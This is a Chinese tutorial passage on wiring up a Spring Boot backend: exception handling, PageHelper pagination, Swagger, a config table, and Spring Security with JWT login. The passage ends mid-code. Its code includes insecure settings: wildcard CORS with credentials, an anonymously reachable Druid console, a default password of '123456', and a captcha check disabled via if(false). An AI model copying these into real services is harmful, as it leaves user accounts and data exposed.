3. 全局异常处理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 @Slf4j @RestControllerAdvice public class GlobalExceptionHandler { /** * 业务异常 */ @ExceptionHandler(ServiceException.class) public ApiResponse handleServiceException(ServiceException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生业务异常.\u0026#34;, requestURI, e); Integer code = e.getCode(); return StringUtils.isNotNull(code) ? ApiResponse.error(code, e.getMessage()) : ApiResponse.error(e.getMessage()); } /** * 拦截未知的运行时异常 */ @ExceptionHandler(RuntimeException.class) public ApiResponse handleRuntimeException(RuntimeException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生未知异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } /** * 系统异常 */ @ExceptionHandler(Exception.class) public ApiResponse handleException(Exception e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生系统异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } } 4. 异常测试 1 2 3 4 5 6 7 8 9 10 11 12 @GetMapping(\u0026#34;/exception\u0026#34;) public ApiResponse exception() { int a = 1; int b = 0; if (b == 0){ throw new ServiceException(MessageUtils.message(\u0026#34;service.division.byZero\u0026#34;)); } return ApiResponse.success(a / 0.5); } Mybatias分页支持 1. 引入依赖 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 2. 配置yml 1 2 3 4 5 6 7 8 9 10 11 # PageHelper分页插件 pagehelper: # 指定分页插件使用哪种数据库方言 helperDialect: mysql # 当该参数设置为 true 时，pageNum\u0026lt;=0 时会查询第一页， pageNum\u0026gt;pages（超过总数时），会查询最后一页。 # reasonable: true # 支持通过 Mapper 接口参数来传递分页参数，默认值false，分页插件会从查询方法的参数值中， # 自动根据上面 params 配置的字段中取值，查找到合适的值时就会自动分页。 supportMethodsArguments: true # 增加了该参数来配置参数映射，用于从对象中根据属性名取值 params: count=countSql 所有配置项：\nhelperDialect：分页插件会自动检测当前的数据库链接，自动选择合适的分页方式。 你可以配置helperDialect属性来指定分页插件使用哪种方言。配置时，可以使用下面的缩写值： oracle,mysql,mariadb,sqlite,hsqldb,postgresql,db2,sqlserver,informix,h2,sqlserver2012,derby **特别注意：**使用 SqlServer2012 数据库时，需要手动指定为 sqlserver2012，否则会使用 SqlServer2005 的方式进行分页。 你也可以实现 AbstractHelperDialect，然后配置该属性为实现类的全限定名称即可使用自定义的实现方法。 offsetAsPageNum：默认值为 false，该参数对使用 RowBounds 作为分页参数时有效。 当该参数设置为 true 时，会将 RowBounds 中的 offset 参数当成 pageNum 使用，可以用页码和页面大小两个参数进行分页。 rowBoundsWithCount：默认值为false，该参数对使用 RowBounds 作为分页参数时有效。 当该参数设置为true时，使用 RowBounds 分页会进行 count 查询。 pageSizeZero：默认值为 false，当该参数设置为 true 时，如果 pageSize=0 或者 RowBounds.limit = 0 就会查询出全部的结果（相当于没有执行分页查询，但是返回结果仍然是 Page 类型）。 reasonable：分页合理化参数，默认值为false。当该参数设置为 true 时，pageNum\u0026lt;=0 时会查询第一页， pageNum\u0026gt;pages（超过总数时），会查询最后一页。默认false 时，直接根据参数进行查询。 params：为了支持startPage(Object params)方法，增加了该参数来配置参数映射，用于从对象中根据属性名取值， 可以配置 pageNum,pageSize,count,pageSizeZero,reasonable，不配置映射的用默认值， 默认值为pageNum=pageNum;pageSize=pageSize;count=countSql;reasonable=reasonable;pageSizeZero=pageSizeZero。 supportMethodsArguments：支持通过 Mapper 接口参数来传递分页参数，默认值false，分页插件会从查询方法的参数值中，自动根据上面 params 配置的字段中取值，查找到合适的值时就会自动分页。 使用方法可以参考测试代码中的 com.github.pagehelper.test.basic 包下的 ArgumentsMapTest 和 ArgumentsObjTest。 autoRuntimeDialect：默认值为 false。设置为 true 时，允许在运行时根据多数据源自动识别对应方言的分页 （不支持自动选择sqlserver2012，只能使用sqlserver），用法和注意事项参考下面的场景五。 closeConn：默认值为 true。当使用运行时动态数据源或没有设置 helperDialect 属性自动获取数据库类型时，会自动获取一个数据库连接， 通过该属性来设置是否关闭获取的这个连接，默认true关闭，设置为 false 后，不会关闭获取的连接，这个参数的设置要根据自己选择的数据源来决定。 aggregateFunctions(5.1.5+)：默认为所有常见数据库的聚合函数，允许手动添加聚合函数（影响行数），所有以聚合函数开头的函数，在进行 count 转换时，会套一层。其他函数和列会被替换为 count(0)，其中count列可以自己配置。 更多信息可以可以看官方文档：\nhttps://github.com/pagehelper/Mybatis-PageHelper/blob/master/wikis/zh/HowToUse.md\n3. 封装分页相关工具 3.1 BaseController 这是一个web层通用处理类。核心方法startPage()请求分页数据方法，使继承BaseController的Controller可以快速使用分页。\n参考链接：\nspringMVC之@InitBinder的用法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 @Slf4j public class BaseController { // protected final Logger logger = LoggerFactory.getLogger(this.getClass()); /** * 将前台传递过来的日期格式的字符串，自动转化为Date类型 */ @InitBinder public void initBinder(WebDataBinder binder) { // Date 类型转换 binder.registerCustomEditor(Date.class, new PropertyEditorSupport() { @Override public void setAsText(String text) { setValue(DateUtils.parseDate(text)); } }); } /** * 设置请求分页数据 */ protected void startPage() { PageUtils.startPage(); } /** * 设置请求排序数据 */ protected void startOrderBy() { PageDomain pageDomain = TableSupport.buildPageRequest(); if (StringUtils.isNotEmpty(pageDomain.getOrderBy())) { String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy()); PageHelper.orderBy(orderBy); } } /** * 清理分页的线程变量 */ protected void clearPage() { PageUtils.clearPage(); } /** * 响应请求分页数据 */ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) protected TableDataInfo getDataTable(List\u0026lt;?\u0026gt; list) { TableDataInfo rspData = new TableDataInfo(); rspData.setCode(HttpStatus.SUCCESS); rspData.setMsg(\u0026#34;查询成功\u0026#34;); rspData.setRows(list); rspData.setTotal(new PageInfo(list).getTotal()); return rspData; } } 3.2 TableDataInfo 自定义分页结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class TableDataInfo implements Serializable { private static final long serialVersionUID = 1L; /** 总记录数 */ private long total; /** 列表数据 */ private List\u0026lt;?\u0026gt; rows; /** 消息状态码 */ private int code; /** 消息内容 */ private String msg; } 3.3 数据传输类PageDTO 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class PageDTO { /** 当前记录起始索引 */ private Integer pageNum; /** 每页显示记录数 */ private Integer pageSize; /** 排序列 */ private String orderByColumn; /** 排序的方向desc或者asc */ private String isAsc = \u0026#34;asc\u0026#34;; /** 分页参数合理化 */ private Boolean reasonable = true } 4. 测试 1 2 3 4 5 6 7 8 9 10 11 12 /** * 查询列表，分页。 返回 TableDataInfo * @return */ @GetMapping(\u0026#34;/page\u0026#34;) public TableDataInfo testPageHelper(){ startPage(); List\u0026lt;SysOperLog\u0026gt; sysOperationLogs = sysOperLogService.selectAll(); return getDataTable(sysOperationLogs); }\t1 2 3 \u0026lt;select id=\u0026#34;selectAll\u0026#34; resultType=\u0026#34;SysOperLog\u0026#34;\u0026gt; select * from sys_oper_log \u0026lt;/select\u0026gt; Swagger集成 1.pom依赖 父级pom\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;properties\u0026gt; \u0026lt;swagger.version\u0026gt;3.0.0\u0026lt;/swagger.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- Swagger3依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${swagger.version}\u0026lt;/version\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;io.swagger\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;swagger-models\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; admin pom\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;!-- swagger3--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 防止进入swagger页面报类型转换错误，排除3.0.0中的引用，手动增加1.6.2版本 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.swagger\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;swagger-models\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.6.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2.swagger config 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 @Configuration public class SwaggerConfig implements WebMvcConfigurer { /** 系统基础配置 */ @Autowired private LabConfig labConfig; /** 是否开启swagger */ @Value(\u0026#34;${swagger.enabled}\u0026#34;) private boolean enabled; /** * 创建API */ @Bean public Docket createRestApi() { return new Docket(DocumentationType.OAS_30) // 是否启用Swagger .enable(enabled) // 用来创建该API的基本信息，展示在文档的页面中（自定义展示的信息） .apiInfo(apiInfo()) // 设置哪些接口暴露给Swagger展示 .select() // 扫描所有有注解的api，用这种方式更灵活 .apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class)) // 扫描指定包中的swagger注解 // .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.opengms.project.tool.swagger\u0026#34;)) // 扫描所有 .apis(RequestHandlerSelectors.any()) .paths(PathSelectors.any()) .build() /* 设置安全模式，swagger可以设置访问token */ .securitySchemes(securitySchemes()) .securityContexts(securityContexts()); } /** * 安全模式，这里指定token通过Authorization头请求头传递 */ private List\u0026lt;SecurityScheme\u0026gt; securitySchemes() { List\u0026lt;SecurityScheme\u0026gt; apiKeyList = new ArrayList\u0026lt;SecurityScheme\u0026gt;(); apiKeyList.add(new ApiKey(\u0026#34;Authorization\u0026#34;, \u0026#34;Authorization\u0026#34;, In.HEADER.toValue())); return apiKeyList; } /** * 安全上下文 */ private List\u0026lt;SecurityContext\u0026gt; securityContexts() { List\u0026lt;SecurityContext\u0026gt; securityContexts = new ArrayList\u0026lt;\u0026gt;(); securityContexts.add( SecurityContext.builder() .securityReferences(defaultAuth()) .operationSelector(o -\u0026gt; o.requestMappingPattern().matches(\u0026#34;/.*\u0026#34;)) .build()); return securityContexts; } /** * 默认的安全上引用 */ private List\u0026lt;SecurityReference\u0026gt; defaultAuth() { AuthorizationScope authorizationScope = new AuthorizationScope(\u0026#34;global\u0026#34;, \u0026#34;accessEverything\u0026#34;); AuthorizationScope[] authorizationScopes = new AuthorizationScope[1]; authorizationScopes[0] = authorizationScope; List\u0026lt;SecurityReference\u0026gt; securityReferences = new ArrayList\u0026lt;\u0026gt;(); securityReferences.add(new SecurityReference(\u0026#34;Authorization\u0026#34;, authorizationScopes)); return securityReferences; } /** * 添加摘要信息 */ private ApiInfo apiInfo() { // 用ApiInfoBuilder进行定制 return new ApiInfoBuilder() // 设置标题 .title(\u0026#34;OPENGMS LAB接口文档\u0026#34;) // 描述 // .description(\u0026#34;接口文档 description\u0026#34;) // 作者信息 .contact(new Contact(labConfig.getName(), null, null)) // 版本 .version(\u0026#34;版本号:\u0026#34; + labConfig.getVersion()) .build(); } @Override public void addResourceHandlers(ResourceHandlerRegistry registry) { /** swagger配置 */ registry.addResourceHandler(\u0026#34;/swagger-ui/**\u0026#34;) .addResourceLocations(\u0026#34;classpath:/META-INF/resources/webjars/springfox-swagger-ui/\u0026#34;); // registry.addResourceHandler(\u0026#34;/**\u0026#34;).addResourceLocations(\u0026#34;classpath:/static/\u0026#34;); // // // 解决swagger无法访问 // registry.addResourceHandler(\u0026#34;/swagger-ui.html\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/\u0026#34;); // // // 解决swagger的js文件无法访问 // registry.addResourceHandler(\u0026#34;/webjars/**\u0026#34;).addResourceLocations(\u0026#34;classpath:/META-INF/resources/webjars/\u0026#34;); } } 3.使用 swagger2的3.0版本的访问地址/swagger-ui/index.html 2.x之前访问地址/swagger-ui.html\n访问http://localhost:8888/swagger-ui/index.html\n使用Swagger Tools插件自动生成接口文档注解：Alt + Ins\n4.集成Knife4j 添加pom\n1 2 3 4 5 6 \u0026lt;!-- knife4j --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 访问地址\nhttp://localhost:8888/doc.html\n参数配置 1.创建数据库表 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 -- ---------------------------- -- 参数配置表 -- ---------------------------- drop table if exists sys_config; create table sys_config ( config_id int(5) not null auto_increment comment \u0026#39;参数主键\u0026#39;, config_name varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数名称\u0026#39;, config_key varchar(100) default \u0026#39;\u0026#39; comment \u0026#39;参数键名\u0026#39;, config_value varchar(500) default \u0026#39;\u0026#39; comment \u0026#39;参数键值\u0026#39;, config_type char(1) default \u0026#39;N\u0026#39; comment \u0026#39;系统内置（Y是 N否）\u0026#39;, create_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;创建者\u0026#39;, create_time datetime comment \u0026#39;创建时间\u0026#39;, update_by varchar(64) default \u0026#39;\u0026#39; comment \u0026#39;更新者\u0026#39;, update_time datetime comment \u0026#39;更新时间\u0026#39;, remark varchar(500) default null comment \u0026#39;备注\u0026#39;, primary key (config_id) ) engine=innodb auto_increment=100 comment = \u0026#39;参数配置表\u0026#39;; insert into sys_config values(1, \u0026#39;主框架页-默认皮肤样式名称\u0026#39;, \u0026#39;sys.index.skinName\u0026#39;, \u0026#39;skin-blue\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;蓝色 skin-blue、绿色 skin-green、紫色 skin-purple、红色 skin-red、黄色 skin-yellow\u0026#39; ); insert into sys_config values(2, \u0026#39;用户管理-账号初始密码\u0026#39;, \u0026#39;sys.user.initPassword\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;初始化密码 123456\u0026#39; ); insert into sys_config values(3, \u0026#39;主框架页-侧边栏主题\u0026#39;, \u0026#39;sys.index.sideTheme\u0026#39;, \u0026#39;theme-dark\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;深色主题theme-dark，浅色主题theme-light\u0026#39; ); insert into sys_config values(4, \u0026#39;账号自助-验证码开关\u0026#39;, \u0026#39;sys.account.captchaEnabled\u0026#39;, \u0026#39;true\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;是否开启验证码功能（true开启，false关闭）\u0026#39;); insert into sys_config values(5, \u0026#39;账号自助-是否开启用户注册功能\u0026#39;, \u0026#39;sys.account.registerUser\u0026#39;, \u0026#39;false\u0026#39;, \u0026#39;Y\u0026#39;, \u0026#39;admin\u0026#39;, sysdate(), \u0026#39;\u0026#39;, null, \u0026#39;是否开启注册用户功能（true开启，false关闭）\u0026#39;); 2.初始化参数 SysConfigServiceImpl\n1 2 3 4 5 6 7 8 /** * 项目启动时，初始化参数到缓存 */ @PostConstruct public void init() { loadingConfigCache(); } 登录和授权 登录实现 1.引入 Spring Security 模块 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 引入依赖后我们在尝试去访问之前的接口就会自动跳转到一个SpringSecurity的默认登陆页面，默认用户名是user,密码会输出在控制台。 必须登陆之后才能对接口进行访问。\n2.编写 Spring Security 配置类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 @EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { /** * 自定义用户认证逻辑 */ @Autowired private UserDetailsService userDetailsService; /** * 认证失败处理类 */ @Autowired private AuthenticationEntryPointImpl unauthorizedHandler; /** * 退出处理类 */ @Autowired private LogoutSuccessHandlerImpl logoutSuccessHandler; /** * token认证过滤器 */ @Autowired private JwtAuthenticationTokenFilter authenticationTokenFilter; /** * 跨域过滤器 */ @Autowired private CorsFilter corsFilter; /** * 允许匿名访问的地址 */ @Autowired private PermitAllUrlProperties permitAllUrl; /** * 解决 无法直接注入 AuthenticationManager * * @return * @throws Exception */ @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } /** * anyRequest | 匹配所有请求路径 * access | SpringEl表达式结果为true时可以访问 * anonymous | 匿名可以访问 * denyAll | 用户不能访问 * fullyAuthenticated | 用户完全认证可以访问（非remember-me下自动登录） * hasAnyAuthority | 如果有参数，参数表示权限，则其中任何一个权限可以访问 * hasAnyRole | 如果有参数，参数表示角色，则其中任何一个角色可以访问 * hasAuthority | 如果有参数，参数表示权限，则其权限可以访问 * hasIpAddress | 如果有参数，参数表示IP地址，如果用户IP和参数匹配，则可以访问 * hasRole | 如果有参数，参数表示角色，则其角色可以访问 * permitAll | 用户可以任意访问 * rememberMe | 允许通过remember-me登录的用户访问 * authenticated | 用户登录后可访问 */ @Override protected void configure(HttpSecurity httpSecurity) throws Exception { // 注解标记允许匿名访问的url ExpressionUrlAuthorizationConfigurer\u0026lt;HttpSecurity\u0026gt;.ExpressionInterceptUrlRegistry registry = httpSecurity.authorizeRequests(); permitAllUrl.getUrls().forEach(url -\u0026gt; registry.antMatchers(url).permitAll()); httpSecurity // CSRF禁用，因为不使用session // 关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求 .csrf().disable() // 认证失败处理类 .exceptionHandling().authenticationEntryPoint(unauthorizedHandler).and() // 基于token，所以不需要session .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS).and() // 过滤请求 .authorizeRequests() // 对于登录login 注册register 验证码captchaImage 允许匿名访问 .antMatchers(\u0026#34;/login\u0026#34;, \u0026#34;/register\u0026#34;, \u0026#34;/captchaImage\u0026#34;).anonymous() // 静态资源，可匿名访问 .antMatchers(HttpMethod.GET, \u0026#34;/\u0026#34;, \u0026#34;/*.html\u0026#34;, \u0026#34;/**/*.html\u0026#34;, \u0026#34;/**/*.css\u0026#34;, \u0026#34;/**/*.js\u0026#34;, \u0026#34;/profile/**\u0026#34;).permitAll() .antMatchers(\u0026#34;/swagger-ui.html\u0026#34;, \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/*/api-docs\u0026#34;, \u0026#34;/druid/**\u0026#34;).permitAll() // 除上面外的所有请求全部需要鉴权认证 .anyRequest().authenticated() .and() .headers().frameOptions().disable(); // 添加Logout filter httpSecurity.logout().logoutUrl(\u0026#34;/logout\u0026#34;).logoutSuccessHandler(logoutSuccessHandler); // 添加JWT filter httpSecurity.addFilterBefore(authenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); // 添加CORS filter httpSecurity.addFilterBefore(corsFilter, JwtAuthenticationTokenFilter.class); httpSecurity.addFilterBefore(corsFilter, LogoutFilter.class); // 开启自动配置的登录功能 // http.formLogin() // .loginPage(\u0026#34;/toLogin\u0026#34;) //自定义登录页 // .loginProcessingUrl(\u0026#34;/loginRequest\u0026#34;) // 登陆表单提交的请求 // .passwordParameter(\u0026#34;password\u0026#34;); // 表单中password需与该处对应。默认是password // http.formLogin(); // 开启自动配置的注销的功能 // http.logout().logoutSuccessUrl(\u0026#34;/\u0026#34;); // 注销成功来到首页 // 记住我 // http.rememberMe(); // http.rememberMe(). // rememberMeParameter(\u0026#34;remember\u0026#34;); // 定制记住我的参数 } /** * 强散列哈希加密实现 */ @Bean public BCryptPasswordEncoder bCryptPasswordEncoder() { return new BCryptPasswordEncoder(); } /** * 身份认证接口 */ @Override protected void configure(AuthenticationManagerBuilder auth) throws Exception { // 数据库验证 // Spring Security 提供了BCryptPasswordEncoder类, // 实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码 auth.userDetailsService(userDetailsService).passwordEncoder(bCryptPasswordEncoder()); } } 3.配置类相关模块 UserDetailsService 自定义用户认证逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Service public class UserDetailsServiceImpl implements UserDetailsService { private static final Logger log = LoggerFactory.getLogger(UserDetailsServiceImpl.class); @Autowired private ISysUserService userService; @Autowired private SysPasswordService passwordService; @Autowired private SysPermissionService permissionService; @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { SysUser user = userService.selectUserByUserName(username); if (StringUtils.isNull(user)) { log.info(\u0026#34;登录用户：{} 不存在.\u0026#34;, username); throw new ServiceException(\u0026#34;登录用户：\u0026#34; + username + \u0026#34; 不存在\u0026#34;); } else if (UserStatus.DELETED.getCode().equals(user.getDelFlag())) { log.info(\u0026#34;登录用户：{} 已被删除.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已被删除\u0026#34;); } else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) { log.info(\u0026#34;登录用户：{} 已被停用.\u0026#34;, username); throw new ServiceException(\u0026#34;对不起，您的账号：\u0026#34; + username + \u0026#34; 已停用\u0026#34;); } passwordService.validate(user); return createLoginUser(user); } public UserDetails createLoginUser(SysUser user) { return new LoginUser(user.getUserId(), user); } } AuthenticationEntryPointImpl 认证失败处理类 返回未授权\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Component public class AuthenticationEntryPointImpl implements AuthenticationEntryPoint, Serializable { private static final long serialVersionUID = -8970718410437077606L; @Override public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException e) throws IOException { int code = HttpStatus.UNAUTHORIZED; String msg = StringUtils.format(\u0026#34;请求访问：{}，认证失败，无法访问系统资源\u0026#34;, request.getRequestURI()); ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(code, msg))); } } LogoutSuccessHandlerImpl 自定义退出处理类 返回成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 @Configuration public class LogoutSuccessHandlerImpl implements LogoutSuccessHandler { @Autowired private TokenService tokenService; @Autowired private IAsyncService asyncService; /** * 退出处理 * * @return */ @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser)) { String userName = loginUser.getUsername(); // 删除用户缓存记录 tokenService.delLoginUser(loginUser.getToken()); // 记录用户退出日志 asyncService.recordLogininfor(userName, Constants.LOGOUT, \u0026#34;退出成功\u0026#34;); } ServletUtils.renderString(response, JSON.toJSONString(ApiResponse.error(HttpStatus.SUCCESS, \u0026#34;退出成功\u0026#34;))); } } JwtAuthenticationTokenFiltertoken token过滤器 验证token有效性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @Component public class JwtAuthenticationTokenFilter extends OncePerRequestFilter { @Autowired private TokenService tokenService; @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws ServletException, IOException { LoginUser loginUser = tokenService.getLoginUser(request); if (StringUtils.isNotNull(loginUser) \u0026amp;\u0026amp; StringUtils.isNull(SecurityUtils.getAuthentication())) { tokenService.verifyToken(loginUser); // 获取权限信息封装到Authentication中 UsernamePasswordAuthenticationToken authenticationToken = new UsernamePasswordAuthenticationToken(loginUser, null, loginUser.getAuthorities()); authenticationToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request)); // 存入SecurityContextHolder SecurityContextHolder.getContext().setAuthentication(authenticationToken) } chain.doFilter(request, response); } } ResourcesConfig 跨域过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration public class ResourcesConfig implements WebMvcConfigurer { /** * 跨域配置 */ @Bean public CorsFilter corsFilter() { CorsConfiguration config = new CorsConfiguration(); config.setAllowCredentials(true); // 设置访问源地址 config.addAllowedOriginPattern(\u0026#34;*\u0026#34;); // 设置访问源请求头 config.addAllowedHeader(\u0026#34;*\u0026#34;); // 设置访问源请求方法 config.addAllowedMethod(\u0026#34;*\u0026#34;); // 有效期 1800秒 config.setMaxAge(1800L); // 添加映射路径，拦截一切请求 UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\u0026#34;/**\u0026#34;, config); // 返回新的CorsFilter return new CorsFilter(source); } } PermitAllUrlProperties 设置Anonymous注解允许匿名访问的url\n参考链接：\nApplicationContextAware接口的作用\n这个接口其实就是获取Spring容器的Bean，在我们写一些框架代码时，或者是看一些框架源码时经常会看到这个接口ApplicationContextAware 的使用，Spring容器会检测容器中的所有Bean，如果发现某个Bean实现了ApplicationContextAware接口，Spring容器会在创建该Bean之后，自动调用该Bean的setApplicationContextAware()方法，调用该方法时，会将容器本身作为参数传给该方法——该方法中的实现部分将Spring传入的参数（容器本身）赋给该类对象的applicationContext实例变量，因此接下来可以通过该applicationContext实例变量来访问容器本身\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 @Configuration public class PermitAllUrlProperties implements InitializingBean, ApplicationContextAware { private static final Pattern PATTERN = Pattern.compile(\u0026#34;\\\\{(.*?)\\\\}\u0026#34;); private ApplicationContext applicationContext; private List\u0026lt;String\u0026gt; urls = new ArrayList\u0026lt;\u0026gt;(); public String ASTERISK = \u0026#34;*\u0026#34;; @Override public void afterPropertiesSet() { RequestMappingHandlerMapping mapping = applicationContext.getBean(RequestMappingHandlerMapping.class); Map\u0026lt;RequestMappingInfo, HandlerMethod\u0026gt; map = mapping.getHandlerMethods(); map.keySet().forEach(info -\u0026gt; { HandlerMethod handlerMethod = map.get(info); // 获取方法上边的注解 替代path variable 为 * Anonymous method = AnnotationUtils.findAnnotation(handlerMethod.getMethod(), Anonymous.class); Optional.ofNullable(method).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); // 获取类上边的注解, 替代path variable 为 * Anonymous controller = AnnotationUtils.findAnnotation(handlerMethod.getBeanType(), Anonymous.class); Optional.ofNullable(controller).ifPresent(anonymous -\u0026gt; info.getPatternsCondition().getPatterns() .forEach(url -\u0026gt; urls.add(RegExUtils.replaceAll(url, PATTERN, ASTERISK)))); }); } @Override public void setApplicationContext(ApplicationContext context) throws BeansException { this.applicationContext = context; } public List\u0026lt;String\u0026gt; getUrls() { return urls; } public void setUrls(List\u0026lt;String\u0026gt; urls) { this.urls = urls; } } 4.登录模块 authenticationManager.authenticate 会调用 UserDetailsServiceImpl.loadUserByUsername 进行身份认证\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public String login(String username, String password, String code, String uuid) { // boolean captchaEnabled = configService.selectCaptchaEnabled(); // 验证码开关 if (false) { // validateCaptcha(username, code, uuid); } // 用户验证 Authentication authentication = null; try { UsernamePasswordAuthenticationToken authenticationToken = new 